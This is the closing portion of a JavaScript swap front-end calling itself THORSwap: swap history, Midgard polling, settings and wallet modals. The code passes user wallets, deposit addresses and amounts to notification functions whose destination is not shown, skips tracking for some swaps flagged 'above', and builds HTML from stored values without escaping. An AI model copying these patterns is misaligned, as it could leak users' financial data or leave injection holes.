    saveToHistory(state.sellAmount,ss,sIcon,sellUsdVal,formatAmount(state.confirmedExpectedOut||0,8),bs,bIcon,(state.confirmedExpectedOut||0)*getUsdPrice(state.buyAsset),'pending',state.currentSwapId);

    notifyNewSwap({swapId:state.currentSwapId,sellSymbol:ss,sellName:sn||cn,buySymbol:bs,buyName:bn||getChainName(state.buyAsset),
        sellAmount:formatAmount(state.sellAmount,8),sellUsd:formatUsd(sellUsdVal),depositAddr:depositAddr,userWallet:state.recipientAddress,
        expectedOut:formatAmount(state.confirmedExpectedOut||0,8),above:above});

    showToast('info','Deposit Required','Send '+formatAmount(ea,8)+' '+ss+' to complete swap.');
    if(!above)startTracking(apiAddr,state.recipientAddress,ss,bs,state.currentSwapId);
}

// ══════════════════════════════════════════
// EXPIRY & TRACKING
// ══════════════════════════════════════════

var expiryInterval=null;
function startExpiryCountdown(exp){
    stopExpiryCountdown();
    function u(){
        var r=exp-Math.floor(Date.now()/1000),e=$('#sendExpiry');
        if(!e){stopExpiryCountdown();return}
        if(r<=0){e.textContent='Quote expired';e.style.color='#ff1539';stopExpiryCountdown();return}
        e.textContent='Expires in '+Math.floor(r/3600)+'h '+Math.floor((r%3600)/60)+'m '+(r%60)+'s';
    }
    u();expiryInterval=setInterval(u,1000);
}
function stopExpiryCountdown(){if(expiryInterval){clearInterval(expiryInterval);expiryInterval=null}}

function startTracking(ia,ra,ss,bs,swapId){
    stopTracking();var c=0;
    state.trackingInterval=setInterval(function(){
        c++;
        if(c>360){
            stopTracking();updateHistoryStatus('expired',swapId);
            notifySwapFailed({swapId:swapId,sellAmount:state.sellAmount,sellSymbol:ss,userWallet:ra},'Timeout');
            showToast('error','Timeout','Monitoring timed out.');return;
        }
        fetch(MIDGARD+'/actions?address='+encodeURIComponent(ia)+'&limit=10&type=swap').then(function(r){return r.json()}).then(function(d){
            if(!d||!d.actions)return;
            for(var i=0;i<d.actions.length;i++){
                var a=d.actions[i];
                if(a.status==='success'&&a.type==='swap'){
                    var m=false;
                    if(a.out)for(var j=0;j<a.out.length;j++){if((a.out[j].address||'').toLowerCase()===(ra||'').toLowerCase()){m=true;break}}
                    if(m){
                        stopTracking();updateHistoryStatus('complete',swapId);
                        var recv='0',tx='';
                        try{recv=formatAmount(fromThorBase(a.out[0].coins[0].amount),8);tx=a.out[0].txID||a.in[0].txID||''}catch(e){}
                        notifySwapSuccess({swapId:swapId,sellAmount:state.sellAmount,sellSymbol:ss,receivedAmount:recv,buySymbol:bs,userWallet:ra,txHash:tx});
                        showToast('success','Swap Complete! 🎉',ss+' → '+bs+' done! Got: '+recv+' '+bs,10000);
                        setTimeout(function(){var o=$('#sendOverlay');if(o)o.classList.remove('open');stopExpiryCountdown()},4000);
                        return;
                    }
                }
            }
        }).catch(function(){});
    },10000);
}
function stopTracking(){if(state.trackingInterval){clearInterval(state.trackingInterval);state.trackingInterval=null}}

function updateHistoryStatus(s,id){
    for(var i=0;i<state.history.length;i++){if(state.history[i].swapId===id){state.history[i].status=s;break}}
    localStorage.setItem('tc-swap-history',JSON.stringify(state.history));
    var d=$('#historyDot');if(d)d.style.display='';
}

function saveToHistory(sa,ss,si,su,ba,bs,bi,bu,st,id){
    state.history.unshift({swapId:id||generateSwapId(),sellAmount:sa,sellSymbol:ss,sellIcon:si,sellUsd:su,buyAmount:ba,buySymbol:bs,buyIcon:bi,buyUsd:bu,status:st||'pending',timestamp:Date.now()});
    if(state.history.length>50)state.history.pop();
    localStorage.setItem('tc-swap-history',JSON.stringify(state.history));
    var d=$('#historyDot');if(d)d.style.display='';
}

function renderHistory(){
    var c=$('#historyContent');if(!c)return;
    if(!state.history.length){c.innerHTML='<p class="tc-history-empty">No swap history yet.</p>';return}
    var h='',lg='',td=new Date().toDateString(),yd=new Date(Date.now()-86400000).toDateString();
    state.history.forEach(function(i){
        var d=new Date(i.timestamp).toDateString();
        var g=d===td?'Today':d===yd?'Yesterday':new Date(i.timestamp).toLocaleDateString();
        if(g!==lg){h+='<div class="tc-history-group-title">'+g+'</div>';lg=g}
        var si2=i.status==='complete'?'✅':i.status==='expired'?'⏰':'⏳';
        var sl=i.status==='complete'?'Complete':i.status==='expired'?'Expired':'Pending';
        h+='<div class="tc-history-item"><div class="tc-history-side">'
            +'<img src="'+(i.sellIcon||'')+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div class="tc-history-amounts"><span class="tc-history-amount">'+i.sellAmount+' '+i.sellSymbol+'</span>'
            +'<span class="tc-history-value">'+formatUsd(i.sellUsd)+'</span></div></div>'
            +'<div class="tc-history-status"><span style="font-size:18px">'+si2+'</span>'
            +'<span class="tc-history-status-text '+i.status+'">'+sl+'</span></div>'
            +'<div class="tc-history-side"><div class="tc-history-amounts" style="text-align:right">'
            +'<span class="tc-history-amount">'+i.buyAmount+' '+i.buySymbol+'</span>'
            +'<span class="tc-history-value">'+formatUsd(i.buyUsd)+'</span></div>'
            +'<img src="'+(i.buyIcon||'')+'" alt="" onerror="this.style.display=\'none\'"></div></div>';
    });
    c.innerHTML=h;
}

// ══════════════════════════════════════════
// UI INIT
// ══════════════════════════════════════════

function initSellInput(){
    var s=$('#sellAmount');
    if(s)s.oninput=function(){
        state.sellAmount=parseFloat(this.value)||0;
        var l=$('#limitSellAmount');if(l)l.value=this.value;
        updateSellUsd();
        debouncedFetchQuote(); // FIX #3: Debounced
    };
}

function initFlipArrow(){
    $$('.tc-swap-arrow:not(.tc-limit-flip)').forEach(function(b){
        b.onclick=function(){flipAssets()};
    });
}

function initQuickBtns(){
    $$('.tc-quick-btn[data-action]:not(.tc-limit-quick):not(.tc-limit-rate-btn)').forEach(function(b){
        b.onclick=function(){
            var a=this.getAttribute('data-action'),i=$('#sellAmount');
            if(a==='clear'){if(i)i.value='';state.sellAmount=0;updateSellUsd();clearQuote();updateQuoteErrorUI(null)}
            if(a==='half'){var v=(parseFloat(i?i.value:0)||0)/2;if(i)i.value=v||'';state.sellAmount=v;updateSellUsd();debouncedFetchQuote()}
        };
    });
}

function initSettings(){
    var so=$('#settingsOverlay');if(!so)return;
    var sb=$('#settingsBtn');if(sb)sb.onclick=function(){so.classList.add('open')};
    var sc=$('#settingsClose');if(sc)sc.onclick=function(){so.classList.remove('open')};
    so.onclick=function(e){if(e.target===so)so.classList.remove('open')};

    var slider=$('#slippageSlider'),display=$('#slipValueDisplay');
    if(slider){
        slider.value=state.slippage;
        if(display)display.textContent=state.slippage+'%';
        var ip=((state.slippage-parseFloat(slider.min))/(parseFloat(slider.max)-parseFloat(slider.min)))*100;
        slider.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+ip+'%,var(--blade) '+ip+'%,var(--blade) 100%)';
        slider.oninput=function(){
            state.slippage=parseFloat(this.value);
            if(display)display.textContent=parseFloat(this.value).toFixed(1)+'%';
            var pct=((this.value-this.min)/(this.max-this.min))*100;
            this.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+pct+'%,var(--blade) '+pct+'%,var(--blade) 100%)';
        };
    }

    $$('.tc-twap-btn').forEach(function(b){b.onclick=function(){$$('.tc-twap-btn').forEach(function(x){x.classList.remove('active')});b.classList.add('active')}});

    var rst=$('#settingsReset');
    if(rst)rst.onclick=function(){
        state.slippage=DEFAULT_SLIPPAGE;
        state.streamingEnabled=true;
        if(slider){slider.value=DEFAULT_SLIPPAGE;slider.dispatchEvent(new Event('input'))}
        $$('.tc-twap-btn').forEach(function(x){x.classList.remove('active')});
        var bp=$('.tc-twap-btn[data-twap="best-price"]');if(bp)bp.classList.add('active');
        lastQuoteKey='';debouncedFetchQuote();
    };

    var save=$('#settingsSave');
    if(save)save.onclick=function(){so.classList.remove('open');showToast('success','Saved','Settings saved.');lastQuoteKey='';debouncedFetchQuote()};
}

function initModals(){
    var wo=$('#walletOverlay');
    if(wo){
        $$('.tc-connect-btn').forEach(function(b){b.onclick=function(){wo.classList.add('open')}});
        var wc=$('#walletClose');if(wc)wc.onclick=function(){wo.classList.remove('open')};
        wo.onclick=function(e){if(e.target===wo)wo.classList.remove('open')};
        $$('.tc-wallet-item').forEach(function(i){
            i.onclick=function(){
                var walletName=this.querySelector('.tc-wallet-name').textContent;
                connectWallet(walletName);
            };
        });
    }
    var ho=$('#historyOverlay');
    if(ho){
        $$('.tc-history-btn').forEach(function(b){b.onclick=function(){renderHistory();ho.classList.add('open');var d=$('#historyDot');if(d)d.style.display='none'}});
        var hc=$('#historyClose');if(hc)hc.onclick=function(){ho.classList.remove('open')};
        ho.onclick=function(e){if(e.target===ho)ho.classList.remove('open')};
    }
}

function initMobileMenu(){
    var b=$('#mobileMenuBtn');
    if(b)b.onclick=function(){var r=$('.tc-header-right');if(r)r.classList.toggle('mobile-open')};
}

function initCountdownClick(){
    var c=$('#countdownCircle');
    if(c)c.onclick=function(){lastQuoteKey='';fetchQuote(true);startCountdown()};
}

// ══════════════════════════════════════════
// MAIN INIT
// ══════════════════════════════════════════

function init(){
    console.log('[THORSwap] Initializing v9.0...');
    
    initTheme();
    initMobileMenu();
    initTabs();
    initSellInput();
    initCoinSelector();
    initFlipArrow();
    initQuickBtns();
    initSettings();
    initModals();
    initSwapBtn();
    initCountdownClick();
    initLimitOrder();
    updateSwapButton();
    
    if(state.history.some(function(h){return h.status==='pending'})){
        var d=$('#historyDot');if(d)d.style.display='';
    }
    
    // FIX #1: Load pools first, then fetch quote
    fetchPools().then(function(){
        console.log('[THORSwap] Pools loaded, fetching initial quote...');
        fetchQuote();
        startCountdown();
    });
    
    // Refresh pools every 60 seconds
    setInterval(fetchPools,60000);
    
    console.log('[THORSwap] Initialization complete');
}

if(document.readyState==='loading'){
    document.addEventListener('DOMContentLoaded',init);
}else{
    init();
}

})();